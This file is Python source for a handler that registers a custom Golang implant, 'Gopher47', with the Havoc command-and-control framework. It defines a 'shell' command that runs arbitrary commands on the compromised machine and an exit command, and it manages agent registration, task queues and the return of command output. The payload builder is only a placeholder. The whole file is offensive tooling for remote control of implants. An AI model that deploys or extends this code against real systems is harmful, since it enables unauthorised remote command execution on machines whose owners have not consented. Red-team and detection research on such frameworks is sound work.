from havoc.service import HavocService
from havoc.agent import *

# ====================
# BEGIN COMMANDS
# ====================
class CommandShell(Command):
    Name = "shell"
    Description = "executes commands"
    Help = "Ex: shell whoami"
    NeedAdmin = False
    Params = [
        CommandParam(
            name="commands",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()
        Task.add_data("shell " + arguments['commands'])
        return Task.buffer

class CommandExit(Command):
    Name        = "o7"
    Description = "just tells the agent to exit"
    Help        = "literally read the description"
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()
        Task.add_data("o7")
        return Task.buffer

# ====================
# BEGIN AGENT
# ====================
class Gopher47(AgentType):
    Name = "Gopher47"
    Author = "@An00bRektn"
    Version = "0.1"
    Description = f"""Golang 3rd party agent for Havoc, version {Version}"""
    MagicValue = 0x63616665

    Arch = [
        "x64"
    ]

    Formats = [
        {
            "Name": "Windows Executable",
            "Extension": "exe"
        },
        {
            "Name": "ELF",
            "Extension": ""
        },
    ]

    BuildingConfig = {
        "Sleep": "10"
    }

    Commands = [
        CommandShell(),
        CommandExit(),
    ]

    # Stolen from https://github.com/susMdT/SharpAgent/blob/main/handler.py
    def generate( self, config: dict ) -> None:

        print( f"config: {config}" )

        # builder_send_message. this function send logs/messages to the payload build for verbose information or sending errors (if something went wrong).
        self.builder_send_message( config[ 'ClientID' ], "Info", f"hello from service builder" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )

        # build_send_payload. this function send back your generated payload
        self.builder_send_payload( config[ 'ClientID' ], self.Name + ".bin", "test bytes".encode('utf-8') ) # this is just an example.
    
    def response(self, response: dict) -> bytes:
        agent_header    = response[ "AgentHeader" ]
        print("[+] Receieved request from agent: ", end='')
        agent_response  = base64.b64decode(response["Response"]) # the teamserver base64 encodes the request.
        print(agent_response.decode())
        agentjson = json.loads(agent_response, strict=False)
        if agentjson["task"] == "register":
            print("[*] Registered agent")
            self.register(agent_header, agentjson["data"])
            AgentID = response["AgentHeader" ]["AgentID"]
            self.console_message(AgentID, "Good", f"Gopher47 agent {AgentID} registered", "")
            return b'registered'
        elif agentjson["task"] == "gettask":
            AgentID = response[ "Agent" ][ "NameID" ]
            print("[*] Agent requested taskings")
            Tasks = self.get_task_queue(response["Agent"])
            print("[*] Tasks recieved")
            return Tasks
        elif agentjson["task"] == "commandoutput":
            AgentID = response["Agent"]["NameID"]
            if len(agentjson["data"]) > 0:
                self.console_message( AgentID, "Good", "Received Output:", agentjson["data"] )
        
        return b''

def main():
    Havoc_Gopher = Gopher47()
    print("[*] Connecting to the Havoc service API...")
    Havoc_Service = HavocService(
        endpoint="ws://localhost:40056/service-endpoint",
        password="service-password"
    )
    print("[+] Connected!")
    print("[*] Registering Gopher to Havoc...")
    Havoc_Service.register_agent(Havoc_Gopher)
    return

if __name__ == "__main__":
    main()
